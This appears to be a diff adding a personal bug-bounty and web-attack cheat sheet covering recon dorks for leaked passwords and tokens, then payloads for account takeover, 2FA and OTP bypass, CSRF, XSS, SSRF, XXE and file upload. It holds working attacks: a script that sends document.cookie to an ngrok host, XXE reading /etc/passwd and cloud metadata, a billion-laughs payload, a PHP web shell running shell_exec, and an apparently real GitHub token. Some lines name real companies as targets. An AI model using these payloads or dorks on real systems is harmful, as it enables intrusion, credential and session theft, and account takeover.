@@ -1,0 +1,1711 @@
+[https://medium.com/@ozguralp](https://medium.com/@ozguralp)   - all about google api
+
+**Google Maps**
+
+- Download APK from [https://apkcombo.com/en-in/urbanclap-now-urban-company-home-services/com.urbanclap.urbanclap/download/apk](https://apkcombo.com/en-in/urbanclap-now-urban-company-home-services/com.urbanclap.urbanclap/download/apk)
+- jadx-1.1.0_mobile  > .jadx_gui > Go to Resources → Resources.arsc > res > values > strings.xml
+- Search for google_maps_key ,  collect key and paste
+- 
+
+[mapsapi.txt](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/822a7ef2-52db-4dfd-af2e-6f5035c66e36/mapsapi.txt)
+
+Google Storage Bucket
+
+[https://www.googleapis.com/storage/v1/b/<bucket-name>/](https://www.googleapis.com/storage/v1/b/rbl-mycard2.appspot.como/)
+
+**Search for firebase**
+
+- Collect URL [https://esoteric-bruin-86807.firebaseio.com](https://esoteric-bruin-86807.firebaseio.com/)
+- [https://sturdy-practice-161006.firebaseio.com](https://sturdy-practice-161006.firebaseio.com/)/.json  —> if permission denied then not exploitable
+- Run [Firebase-Write-Permission-Exploit.py](http://firebase-write-permission-exploit.py/)
+- python maps_api_scanner.py   - tool to check of the api is vulnerable
+
+
+https://maps.googleapis.com/maps/api/staticmap?center=19.255669,72.976208&zoom=12&size=2500x2000&maptype=roadmap&key=
+
+# Secretfinder
+
+python3 [SecretFinder.py](http://secretfinder.py/) -i [https://dash.callbell.eu/](https://dash.callbell.eu/) -e -o cli
+
+
+# Shodan
+
+# Cmd:-
+
+- ssl:"urbanclap"
+- ssl:target.* 200
+- ssl:"urbanclap" 200
+- [Ssl.cert.subject.CN](http://ssl.cert.subject.cn/):"target.*" 200
+- org:"Amazon" ssl:"urbanclap"
+- hostname:redacted.com
+- If ssl:"urbanclap" doesnt return no result use :-   **ssl.cert.subject.CN:"urbanclap"**
+- Search for jenkins server in shodan
+- username: admin and password:’OR 1=1 — +
+- "X-Jenkins" "Set-Cookie: JSESSIONID" http.title:"Dashboard"  - open jenkins instance
+- python [shodanish.py](http://shodanish.py/)  - to find shodan results filters
+- [https://medium.com/@malavsharma/magic-of-shodan-15dd17854099](https://medium.com/@malavsharma/magic-of-shodan-15dd17854099)    - useful commands
+- hostname:"[company.com](http://company.com/)" org:"comapany" ports:"23"
+
+[https://www.n00py.io/2017/01/compromising-jenkins-and-extracting-credentials/](https://www.n00py.io/2017/01/compromising-jenkins-and-extracting-credentials/)
+
+
+site:codepad.co "instacart.tools"
+site:scribd.com "instacart.tools"
+site:npmjs.com "instacart.tools"
+site:npm.runkit.com "instacart.tools"
+site:libraries.io "instacart.tools"
+site:ycombinator.com "instacart.tools"
+site:coggle.it "instacart.tools
+site:papaly.com "instacart.tools"
+site:google.com "instacart.tools"
+site:trello.com "instacart.tools"
+site:prezi.com "instacart.tools"
+site:jsdelivr.net "instacart.tools"
+site:codepen.io "instacart.tools"
+site:codeshare.io "instacart.tools"
+site:sharecode.io "instacart.tools"
+site:pastebin.com "instacart.tools"
+site:repl.it "instacart.tools"
+site:productforums.google.com "instacart.tools"
+site:gitter.im "instacart.tools"
+site:bitbucket.org "instacart.tools"
+site:*.atlassian.net "instacart.tools"
+atlassian.net "instacart.tools"
+inurl:gitlab "instacart.tools"
+
+
+
+Use this in github
+
+"http://instacart.tools.atlassian.net" password
+"http://jira.traget.com" password
+"http://internal.instacart.tools.com" password
+"instacart.tools.atlassian" password
+"instacart.tools.okta" password
+"http://corp.instacart.tools" password
+"http://jira.instacart.tools" password
+"instacart.tools.onelogin" password
+instacart.tools.service-now password
+
+"http://instacart.tools" dotfiles
+"http://instacart.tools" authorizationToken
+"http://instacart.tools" access_token
+"http://instacart.tools" secret_key
+corp.company 
+internalcompany.com 
+companyinternal.com
+
+
+
+# Github Recon
+
+# Automation
+
+python3 [GitDorker.py](http://gitdorker.py/) -tf token.txt -q [lob.com](http://lob.com/) -d Dorks/main.txt -o lob   —-new
+
+****************************************
+
+org:bugcrowd  keyword
+
+1)  "site.com"
+
+2)  "sub.site.com" 
+
+3) "site" 
+
+4) *.site. *
+
+5) "target.atlassian" password
+
+6) "jira.target" password
+
+7)  "internal.company.com" password
+
+8) "target.okta" password
+
+9) "corp.target" 
+
+10) "target.onelogin" password
+
+11) "target.service-now" password
+
+
+
+# Registration of account
+
+Register with company email, intercept the request and change the status code from 401 unauthorised to 302 found
+
+
+# Content discovery
+
+- url [dji.com](http://dji.com)  (bashprifile command - to find sensitive info)
+- ffuf -w wordlist.txt -u target/FUZZ -mc 200 -fs 42 -c -v -recursion -recursion-depth 16    - emad shanab wordlist
+- ffuf -w /root/Desktop/payloads/emad_content_discovery.txt -u [pegasusnike.olark.com/FUZZ](http://pegasusnike.olark.com/FUZZ) -mc 200 -fs 42 -c -v -recursion -recursion-depth 16
+- Use burp
+- python3 [crawler.py](http://crawler.py/) -d [https://enterprise.dji.com](https://enterprise.dji.com/) -l 3     - crawles websites
+- python [waybackMachine.py](http://waybackmachine.py/) [https://everykey.com](https://everykey.com/)      - wayback machine
+- python [cc.py](http://cc.py) -d [target.com](http://target.com)  - crawling website (similar to wayback)
+- [https://www.internetmarketingninjas.com/seo-tools/google-sitemap-generator/](https://www.internetmarketingninjas.com/seo-tools/google-sitemap-generator/)
+- [https://app.deepcrawl.com/signup](https://app.deepcrawl.com/signup)
+- python3 [paramspider.py](http://paramspider.py/) --domain [memory.dji.com](http://memory.dji.com/)   - discover endpoints on website   - use tool  ([https://github.com/devanshbatham/ParamSpider](https://github.com/devanshbatham/ParamSpider))
+- dirsearch.py -u [skcccempri.karnataka.gov.in](http://skcccempri.karnataka.gov.in/) -e * -r -w /root/Desktop/payloads/new_raft.txt
+
+- **using gf on the results**
+- gf ssrf (waybackdata from pramaspider)
+- xss, redirect, sqli, rce
+
+tools to find hidden parameters
+
+[https://github.com/Bo0oM/ParamPamPam](https://github.com/Bo0oM/ParamPamPam)
+
+[https://github.com/s0md3v/Arjun](https://github.com/s0md3v/Arjun)
+
+[https://github.com/portswigger/param-miner](https://github.com/portswigger/param-miner)
+
+[https://github.com/maK-/parameth](https://github.com/maK-/parameth)
+
+
+
+
+# Dirsearch to fuzz directory
+
+# Tool - Dirsearch
+
+- ./dirsearch.py -u [test.everykey.com](http://test.everykey.com/) -e * -r -w /root/Desktop/payloads/new_raft.txt
+- ffuf -c -w /root/Desktop/payloads/new_raft.txt -u /FUZZ
+- use ffufplus for directory brute force, hidden param
+
+ffufplus
+
+
+# Google Dorks
+
+[dorks.txt](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/56edc199-ad46-4434-9168-ec542e8823c5/dorks.txt)
+
+intext:"responsible disclosure" intext:"monetary bounty"     -new
+
+To find sensitive info
+
+- [https://pentest-tools.com/information-gathering/google-hacking#](https://pentest-tools.com/information-gathering/google-hacking#)
+- Find sensttive info on third part websites
+
+[compamy_dork.txt](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/4a705ae1-020f-41d9-8975-2dbea82cbed7/compamy_dork.txt)
+
+inurl:example.com intitle:"index of"
+
+inurl:example.com intitle:"index of /" "*key.pem"
+
+inurl:example.com ext:log 
+
+inurl:example.com intitle:index of ext:sql | xls | xml | json | csv
+
+inurl:example.com "MYSQL_ROOT_PASSWORD:" ext:env OR ext:yml -git
+
+site:rightmesh.io inurl:&
+site:rightmesh.io ext:php
+site:rightmesh.io ext:php
+site:rightmesh.io ext:jsp
+site:rightmesh.io ext:asp
+site:rightmesh.io ext:aspx
+site:rightmesh.io ext:xml
+site:rightmesh.io ext:txt
+
+site:rightmesh.io inurl:admin
+site:rightmesh.io inurl:login
+site:rightmesh.io inurl:register
+site:rightmesh.io inurl:signup
+site:rightmesh.io inurl:unsubscribe
+site:rightmesh.io inurl:redirect
+site:rightmesh.io inurl:returnUrl
+
+Tools :-
+
+hakrawler -url target -all
+
+hakrawler -url target -depth 1
+
+gau target.com
+
+Find bug bounty programs 
+
+site:*.*.* inurl:bug inurl:bounty
+
+site:help.*.* inurl:bounty
+
+site:support.*.* intext:security report reward
+
+intext:security report monetary inurl:security
+
+intext:security report reward inurl:report
+
+site:security.*.* inurl: bounty
+
+site:*.*.de inurl:bug inurl:bounty
+
+site:*.*.* inurl:bug inurl:bounty
+site:help.*.* inurl:bounty
+
+inurl:support intext:bug bounty reward  -new
+
+intext:please report it through our SafeHats portal, which is where we run this program"
+
+
+# Password Reset Funcionality
+
+- Forget password
+- Change the username, email address, login id while intercepting
+- Host: [victim.com](http://victim.com):'<a href="//attacker.com/?    (password reset via dangling markup)
+- Add email address eg   abc@gmail.com;xyx@gmail.com in email parameter
+- user seperator :-  ,  (comma), %20,  |
+- password reset link :- Request change password request from within account
+
+                                         Now logout from the account and request Forgot password
+
+                                         if received 2 emails then test it
+
+- Request for password reset link and do not open it
+
+      Now go to account setting and change the email and password. Now go the earlier saved password reset link and reset the password.
+
+ 
+
+- disable the account from setting page and request for password reset
+- Old Password change bypass using [] eg. intercept request in BS and add [] after name pwd[]
+
+ 
+
+[https://0xayub.gitbook.io/blog/](https://0xayub.gitbook.io/blog/)    check blog
+
+- Request a password request, click on the link and change the email to victim email address.
+- Delete the account without password confirmation
+
+
+
+Host:
+X-Host: 
+X-Forwarded-For: 
+X-Forwarder- Host: 
+X-Forwarder- Server
+
+: 
+Forwarded: 
+X-HTTP-Host- Override: 
+X-Forwarded-Proto headers:
+
+
+
+# Account Takeover
+
+- add burp collab at host header.    host: victim.com.burplink.net
+- Assuming user is already Logged in, if you can change email with confirmation of old/password .
+- 
+- Request for password reset and check for response, if its leaking any password reset link
+- Try removing the old password parameter through burp suite
+- Try providing different user’s password.
+- Response manipulation.
+- Check for CSFR for Change password
+- Request for password reset, go to gmail and click on the link. Now intercept the link and change the email to attacker email.
+- Request for password reset, go to gmail and click on the link. Now update the new passswod and confirm password. Intercept the request and change the email to victim.
+- Intercept the password reset page and change the X-Forwarded-Host: [bing.com](http://bing.com/)
+
+      check email if the there is token leakage at bing.com. If true then start your ngrok server and change change the X-Forwarded-Host: ngrokserver. 
+
+      Reset the password and check for token leakage in ngrok server
+
+      [https://medium.com/@vbharad/account-takeover-through-password-reset-poisoning-72989a8bb8ea](https://medium.com/@vbharad/account-takeover-through-password-reset-poisoning-72989a8bb8ea)
+
+- Intercept and add another email address in email field. eg. {“email”:[“victim@gmail.com”,”attacker@gmail.com”],”token”:”some random token”}
+- check Reset via OTP sent on email and Reset via OTP sent on mobile. Try to mauplate the Json parameter "email", "mobile" and "token"
+- Intercept the request and put email:victim mail%0d%0acc:hacker mail id. The server sends an email with CC attacker email..
+
+          email:victim mail
+          cc:hacker mail id
+
+- Takeover company linkedin page. Command:-      blc -rof --filter-level 3 [https://booking-api.goeuro.com](https://booking-api.goeuro.com/)
+- Login via google/facebook  and try to make changes to email username parameter
+
+  
+
+[https://blog.usejournal.com/tale-of-account-takeover-in-multiple-website-5d6e5e4eda04](https://blog.usejournal.com/tale-of-account-takeover-in-multiple-website-5d6e5e4eda04)
+
+- create account via web and make some changes, now try to create using same email address in mobile app.
+
+*Go to password change page.
+
+*use paraminer and use guess json parameter if it shows user id
+
+
+
+# Email verification bypass while registration
+
+- Assuming the user is logged it, attacher can change user email with any password confirmation
+- Bypassing new email updation:- Manupliate response
+- After registration, go to inspect element and try changing the email address and phone number
+- URL having 2 param email= and token= 10alphabet token,  change it to abcdefghi (10 alp)
+
+
+# Cookies not expiring
+
+Login & then logout from the app.
+
+Now check if you can still login with the old cookies
+
+
+
+# 2FA bypass
+
+- Bypass via response header.
+- 200 OK
+- Register account and if your are able to activate 2FA without confirming the email then it is vulnerable.
+- 1. Capture request in burpsuite, 2. Engagement tools> Generate CSRF POC
+3. Pass null chars in token value so function will over-ride, 4. Submit twice for overriding, 5. 2FA disabled
+
+         null= %00
+
+- use attacker token to bypass 2fa
+- After entering OTP check which page it is redirecting. eg:- /dashboard. Now enter username and password, in OTP enter screen change the URL to ./dashboard.
+- [https://medium.com/@seqrity/bypass-2fa-like-a-boss-378787707ba](https://medium.com/@seqrity/bypass-2fa-like-a-boss-378787707ba)
+
+
+
+# No rate limit bypass/ OTP
+
+- login, registration, password reset
+- Bypass :- %00, %0d%0a, %09, %0C, %20, %0
+- Injecting, X-Forwarded-For : Header with random values leads to bypass rate limit protection 429
+- OTP bypass- Save the token value of Attacker. Enter incorrect token on victim and use the attacker token to bypass
+- Add %09, %00  after email and mobile
+
+**OTP**
+
+Request for OTP,  on the "enter OTP" screen right click and inspect element. Check the event in inspector 
+
+go to console and enter the event name and sumbit. Now open the file in dubbeger 
+
+[https://medium.com/@shahjerry33/otp-bypass-developers-check-5786885d55c6](https://medium.com/@shahjerry33/otp-bypass-developers-check-5786885d55c6)
+
+Rate limit bypass:
+Add header/s with request
+X-Originating-IP: IP
+X-Forwarded-For: IP
+X-Remote-IP: IP
+X-Remote-Addr: IP
+X-Client-IP: IP
+X-Host: IP
+X-Forwared-Host: IP
+
+If bypass successful, & after a while blocking request again. Increment the last octate
+
+[https://www.inoreader.com/article/3a9c6e783afdf8d8-how-i-bypassed-the-otp-verification-process-part-3](https://www.inoreader.com/article/3a9c6e783afdf8d8-how-i-bypassed-the-otp-verification-process-part-3)   (turbo intruder)
+
+- checked the page where it is redirecting after OTP verification. eg ./dashboard . Change the request to ./dashboard
+- change the response to 200 OK
+- Brute force OTP in turbo intruder
+- Change the parameter of email / phone to attacker phone to receive OTP.
+
+- Enter correct OTP, forward the request and check if there is email parameter.
+
+email:attacker.com otp:1234
+
+Now change the email to victim.com
+
+
+
+
+
+# XSS
+
+bash [blindxss.sh](http://blindxss.sh)   - scan for xss and bxss
+
+Reflected, stored and blind
+
+- site:*.everykey.com inurl:'&'       (**Knoxss**)
+- site:*.everykey.com inurl:%3D
+
+{"id":"abcabc\"><svg/onload=confirm(1)>abcabc","name":"file-name"}     - json xss payload
+
+# Payloads
+
+- "><svg/onload=alert(1)>
+- <input onfocus=alert(0) autofocus>
+- <body onload="alert(0);">s
+
+# XSS via file upload.
+
+- XSS file upload bypass  (pending)
+
+**KXSS - Tool**
+
+cat urls.txt | kxss
+
+**CSV file upload payload**
+
+</Textarea/</Noscript/</Pre/</Xmp><Svg /Onload=confirm(document.domain)>”
+
+XSS to steal cookie using ngrok
+
+<script>x=new XMLHttpRequest();x.open('GET','[https://764ec77e.ngrok.io/'+document.cookie](https://764ec77e.ngrok.io/'+document.cookie));x.send();</script>
+
+
+
+
+
+# CSRF Bypass
+
+- Remove X-CSRF token header
+- Use token of attacker
+- Try changing One or to character in CSFR token
+- Check the CSRF token length. eg 10 character length.
+create a similar token with 10 length character.
+- Use same CSRF token, or previously used CSRF token
+- First remove CSRF token and remove CSRF_Token= parameter
+- Change the request from POST to GET
+POST /changepassword HTTP/1.1
+<redacted>current_password=currentpassword&new_password=new_password&confirm_password=new_password&anti_csrf=<token>
+
+       GET /changepassword?new_password=new_password&confirm_password=new_password HTTP/1.1
+
+- Change the content type from "content-type: application/x-www-form-urlencoded"  to "content-type: multipart/form-data"
+- Change encrption type to :-  <form id="csrf" enctype="application/x-www-form-urlencoded" method="POST" action="[https://www.example.com/api/REDACTED/PATH](https://www.example.com/api/REDACTED/PATH)">
+- If site is validatiing referer header
+add <meta name=”referrer” content=”no-referrer”>  to CSRF poc.
+
+Edge Case➖
+
+- IF there is a feature to add secondary email. Add your secondary email on your account and again remove it.
+Now try for CSRF on victims account with the email you used.
+- Check the header & Referer Header  "Both should match"
+GET /userName2/account/cancelTrial/?&googleAnalyticsId=&mktToken
+Referer: [https://example.com/userName2/account/account](https://example.com/userName2/account/account)
+- Try not closing the HTML tag eg. </html>
+change it to <html> or html>
+- JSON CSRF - [https://infosecwriteups.com/how-i-exploit-the-json-csrf-with-method-override-technique-71c0a9a7f3b0](https://infosecwriteups.com/how-i-exploit-the-json-csrf-with-method-override-technique-71c0a9a7f3b0)
+
+        JSON CSRF exploittion [https://0xveera.medium.com/advance-json-post-exploitation-cors-csrf-broken-access-control-c18841b98a50](https://0xveera.medium.com/advance-json-post-exploitation-cors-csrf-broken-access-control-c18841b98a50)
+
+         If the request is PUT than change it to POST and add _method=PUT at the end
+         api/daily/update_profile?_method=PUT
+
+- wss: websocket
+[https://medium.com/@osamaavvan/exploiting-websocket-application-wide-xss-csrf-66e9e2ac8dfa](https://medium.com/@osamaavvan/exploiting-websocket-application-wide-xss-csrf-66e9e2ac8dfa)
+- Use Iframe <iframe [src=xxxxxx.burpcollaborator.net](http://src%3Dxxxxxx.burpcollaborator.net/)></iframe> to CSRF
+[https://medium.com/@irounakdhadiwal999/stored-iframe-injection-csrf-account-takeover-42c93ad13f5d](https://medium.com/@irounakdhadiwal999/stored-iframe-injection-csrf-account-takeover-42c93ad13f5d)
+- CSRF if the id=number is not guessable. Brute Force using simple script on the below blog
+[https://smaranchand.com.np/2019/10/an-inconsistent-csrf/](https://smaranchand.com.np/2019/10/an-inconsistent-csrf/)[https://medium.com/@armaanpathan/brute-forcing-user-ids-via-csrf-to-delete-all-users-with-csrf-attack-216ccd4d832c](https://medium.com/@armaanpathan/brute-forcing-user-ids-via-csrf-to-delete-all-users-with-csrf-attack-216ccd4d832c)
+- [https://blog.witcoat.com/2020/12/03/site-wide-csrf-on-glassdoor/](https://blog.witcoat.com/2020/12/03/site-wide-csrf-on-glassdoor/) (POST_CSRF_GLASSDOOR)
+
+
+
+
+# IDORS
+
+- signup
+- reviews
+- unsubscribe
+- feedback form
+- Setting page
+- Image upload page
+- profile page
+- UIDS, user_id, plan_id
+- User hashs
+- email
+- images that are not public
+- receipts
+- shipping info & purchase order
+- sending and deleting order
+- booking reference
+
+Autorize 
+
+Add cookies of user 2 
+
+Add filter:-  scope items only 
+
+On the autorize
+
+Go to proxy and remove 403 as out of scope
+
+Stories Of IDOR-Part 2
+
+[https://medium.com/@corneacristian/top-25-idor-bug-bounty-reports-ba8cd59ad331](https://medium.com/@corneacristian/top-25-idor-bug-bounty-reports-ba8cd59ad331)
+
+
+
+
+# EXIF data not stripped
+
+- [http://exif.regex.info/exif.cgi](http://exif.regex.info/exif.cgi)
+- Upload image in user profile and check of EXIF data
+
+**EXIF METADATA**
+
+Check the policy document on a website
+
+exiftool -a document name & path
+
+
+
+
+
+
+# Find wayback urls
+
+# Tool - waybackMachine
+
+- python [waybackMachine.py](http://waybackmachine.py/) [https://everykey.com](https://everykey.com/) > filename.txt
+- cat paysera.txt | grep ".js"
+- cat paysera.txt | grep "url"
+- cat paysera.txt | grep "redirect"
+
+
+
+# Find hidden parameter
+
+# Tool - Arjun
+
+- python3 [arjun.py](http://arjun.py) -u url
+
+
+
+
+# Extract JS files
+
+# To extract JS files from a website- (Tool- subjs)
+
+- cat 1.txt | subjs
+
+cat blockfi.com_httpx.txt | waybackurls | grep ".js" | sort -u > blockfi.com_wbu-jsfiles.txt
+
+get all js files from subjs 
+
+get all js files from waybackurls
+
+sort uniq
+
+run secrefinder
+
+
+
+# Extract links from JS files
+
+# To extract links from JS files - (Tool - LinkFinder)
+
+- python [linkfinder.py](http://linkfinder.py/) -i [https://shop.liquidweb.com/wp-content/plugins/wp-e-commerce/wpsc-core/js/user.js](https://shop.liquidweb.com/wp-content/plugins/wp-e-commerce/wpsc-core/js/user.js)
+- curl [https://paypalobjects.com/api/checkout.js](https://paypalobjects.com/api/checkout.js) | grep '//' (to grep inside js files)
+
+# Manual Search keywords in .js files
+
+- query/optional/(hidden paramater)
+- api
+- internal
+- url:
+- var =
+- //
+- https://
+- [company.com](http://company.com/)
+- location.search
+- parameter
+- cookies.get
+- cookies
+
+./script.sh in jsscanner folder
+
+
+
+
+# Open Redirect
+
+- inurl:%3Dhttps%3A%2F%2F
+- Spider burp suite
+- Url=HTTP:www.google.com   (bypass)
+- [//google.com](//google.com)   (payload)
+- Use open redirect payload under payloads folder
+- open redirect using GET based
+- uri=°/[evil.com](https://evil.com/)   bypass
+- redirect=https://google.comğ.target.com   it should redirect to [google.com/?target.com](http://google.com/?target.com)
+
+
+
+# Github Hidden Parameter
+
+# To find link and parameter in github (Tool [githubendpoints.py](http://githubendpoints.py/))
+
+- python3 [githubendpoints.py](http://githubendpoints.py/) -d [rightmesh.io](http://rightmesh.io/) -t 4be89e84409f4edeeb5c55d75f0780f364557a05 -s -r
+
+
+
+# SSRF
+
+pentester lab -
+
+[http://127.0.0.1:1234](http://127.0.0.1:1234/)
+
+[http://localhost:1234](http://localhost:1234/)  , [http://127.0.0.2:1234](http://127.0.0.1:1234/)    [hackingwithpentesterlab.link](http://hackingwithpentesterlab.link)   when 127.0.0.1 is blacklisted
+
+- nc [scanme.nmap.org](http://scanme.nmap.org/) 22   --open port
+- nc [scanme.nmap.org](http://scanme.nmap.org/) 111  ---closed port
+
+# Scanning internal ports:-
+
+- SMB port -- 445
+- Random port -- 31337
+- [http://scanme.nmap.org:22](http://scanme.nmap.org:22/)
+
+# To find Jira instance
+
+- inurl:companyname intitle:JIRA login
+- inurl:visma intitle:JIRA login
+
+# SSRF Parameter
+
+dest redirect uri
+path continue url
+window next data
+reference site html
+val validate domain
+callback return page
+view dir show
+
+file document folder
+root path pg style
+pdf template php_path
+doc feed host
+port to out
+navigation open result
+
+# First Test local instance:- http:
+
+- [http://localhost](http://localhost/)
+- [http://0](http://0.0.0.0/)
+- [http://127.0.0.1](http://127.0.0.1/)
+- [https://localhost](https://localhost/)
+- [http://localhost:8080](http://localhost:8080/)
+- [http://192.168.0.1](http://192.168.0.1/)
+
+# Test File extension:-
+
+- file:///
+- file:///etc/passwd
+- file:///c/
+- chrome://about
+- about:addons
+
+# Other Extension:-
+
+- file:///
+- dict:///
+- sftp:///
+- ldap:///
+- ldaps:///
+- ldapi://
+- ftp:///
+- rftp:///
+- gopher:///
+- <?php
+header(‘Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest’);
+?>
+
+# External SSRF via SVG File
+
+<svg xmlns:svg=”[http://www.w3.org/2000/svg](http://www.w3.org/2000/svg) " xmlns=”[http://www.w3.org/2000/svg](http://www.w3.org/2000/svg) " xmlns:xlink=”[http://www.w3.org/1999/xlink](http://www.w3.org/1999/xlink) " width=”200" height=”200"> <image height=”30" width=”30" xlink:href=”[http://EVILHOST:1337/SVG-SSRF-TEST](http://evilhost:1337/SVG-SSRF-TEST)" /> </svg>
+
+# XXE via SVG File (Blind Internal SSRF) [CRITICAL]
+
+<svg xmlns:svg=”[http://www.w3.org/2000/svg](http://www.w3.org/2000/svg) " xmlns=”[http://www.w3.org/2000/svg](http://www.w3.org/2000/svg) " xmlns:xlink=”[http://www.w3.org/1999/xlink](http://www.w3.org/1999/xlink) " width=”200" height=”200"> <image height=”30" width=”30" xlink:href=”[http://EVILHOST:1337/SSRF?&XXE;](http://evilhost:1337/SSRF?&XXE;)" /> </svg>
+
+Logout from app and check response if its leaking any external services. logout_path=
+
+**Start ngrok server**
+
+- ngrok http 80
+- start xammp server
+- [http://8072e053.ngrok.io/1.txt](http://8072e053.ngrok.io/1.txt)
+
+- [https://github.com/incredibleindishell/SSRF_Vulnerable_Lab](https://github.com/incredibleindishell/SSRF_Vulnerable_Lab)
+
+**Tool :**- gaussrf
+
+**Tips**
+
+uri=http://0.0.0.0
+
+uri=http://0.0.0.0/administrator/dashboad
+
+[https://shahjerry33.medium.com/blind-ssrf-the-hide-seek-game-da9d0ecef2fb](https://shahjerry33.medium.com/blind-ssrf-the-hide-seek-game-da9d0ecef2fb)    - blind ssrf by using collab everywhere 
+
+[https://github.com/swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap)
+
+[https://dant0x65.medium.com/bug-bounty-tip-automating-ssrf-ea344ec59962](https://dant0x65.medium.com/bug-bounty-tip-automating-ssrf-ea344ec59962)   ssrf automation by autorepeater
+
+https?:\/\/(www\.)?[-a-zA-Z0–9@:%.*\+~#=]{1,256}\.[a-zA-Z0–9()]{1,6}\b([-a-zA-Z0–9()@:%*\+.~#?&//=]*)
+
+
+
+# Code Injection
+
+- {${sleep(lc(20))}}
+- try it on post form
+- on all fields and check the delay in the response.
+
+
+XXE
+http://ghostlulz.com/xml-external-entityxxe/
+change the Content-Type: text/xml
+start ruby ruby -run -e httpd . -p 80 
+start ngrok server :- ngrok http 80 
+First test this-    (use &xxe;  in field which is reflecting in response. For eg. if last name is reflecting in response, then add new doc type as = 
+<!DOCTYPE test [<!ENTITY xxe "thisistest"> ]>    and use &xxe;  in last name field.  This will prove the vulnerability if exist.
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE foo [<!ENTITY xxe "thisistest"> ]>
+<userInfo>
+<firstname>John</firstname>
+<lastname>&xxe;</lastname>
+</userInfo>
+⇒ output will be John thisistest  because xxe entity is defined as thisistest
+To read local files 
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<userInfo>
+<firstname>John</firstname>
+<lastname>&xxe;</lastname>
+</userInfo>
+file:///proc/self/ 
+⇒ output will be John root details
+XXE to SSRF
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http:169.254.169.254"> ]>
+<userInfo>
+<firstname>John</firstname>
+<lastname>&xxe;</lastname>
+</userInfo>
+⇒ Output will be metadata of the website
+Blind XXE
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE test [<!ENTITY % dtd SYSTEM "http://xxe.blindf.com/vi/xxe.dtd">%dtd;]>
+<root>
+<password>&e1;</password>
+<username>admin</username>
+</root>
+XXE: Base64 Encoded
+<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/> 
+Billion Laugh attack.
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+ <!ENTITY lol "lol">
+ <!ELEMENT lolz (#PCDATA)>
+ <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+ <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+ <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+ <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+ <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+ <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+ <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+ <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+ <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<lolz>&lol9;</lolz>
+When Entitlies are blocked.  use % 
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://burpcollab.net"> %xxe;]>
+<userInfo>
+<firstname>John</firstname>
+<lastname>1</lastname>
+</userInfo>
+https://portswigger.net/web-security/xxe/blind   -alll blind xxe
+XXE when there is no XML parser error or no XML entitly line present in request.
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>
+XXE via file upload
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+   <text font-size="16" x="0" y="16">&xxe;</text>
+</svg>
+https://github.com/payloadbox/xxe-injection-payload-list   ALL PAYLOAD FOR XXE
+
+
+
+# Credit card info saved in plan text
+
+Save the credit card details on your profile.
+
+Now enter the first few digits of the CC number and see if you are able to view whole CC number
+
+
+
+# Session not expiring after password change
+
+login on account on two different browzer
+
+Change the password from account
+
+Now Refresh the 2nd browzer and check if the session has expired
+
+
+
+# Disclosure of Credentials
+
+Change of Https to http
+
+Check on login & signup
+
+
+
+# File Upload
+
+file.html%00.pdf
+
+file.php%00.jpg
+
+[https://medium.com/@519udhaya/unrestricted-file-upload-vulnerability-bba4491a08da](https://medium.com/@519udhaya/unrestricted-file-upload-vulnerability-bba4491a08da)    — good blog
+
+[https://medium.com/@satboy.fb/art-of-unrestricted-file-upload-exploitation-92ed28796d0](https://medium.com/@satboy.fb/art-of-unrestricted-file-upload-exploitation-92ed28796d0)  — all filter bypass and technique
+
+**(1) Blindxss check**
+
+- If there is human file verification. The upload blind_X_payload.html.
+- blind_pdf_payload.pdf.
+- 
+
+**(2)** **PHP file bypass**
+
+- upload php_cmd.php file
+- Change the content-type to image/gif and start content with GIF89a;
+- Change the content type from image/png to application/php and add the below php command
+- <?php echo shell_exec($_GET[’cmd’].’ 2>&1’); ?>
+- now use :- [https://targeturl/php_cmd.php?cmd=cat](https://targeturl/php_cmd.php?cmd=cat)+etc+password
+- php5, pHp,Php,phP
+- 
+
+**(3) If website accepts only jpg file**
+
+- upload 123.html.jpeg file
+- change content type to image/jpeg  & remove .jpeg from the file name
+
+**(4)** I**mage-tragick payload**   - [https://hackerone.com/reports/412021](https://hackerone.com/reports/412021)
+
+[image_magix.txt](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/93a01c8b-c9af-4250-a734-52a9970f5ef5/image_magix.txt)
+
+**(5)** **Upload svg file with xss**
+
+Upload evil.svg  
+
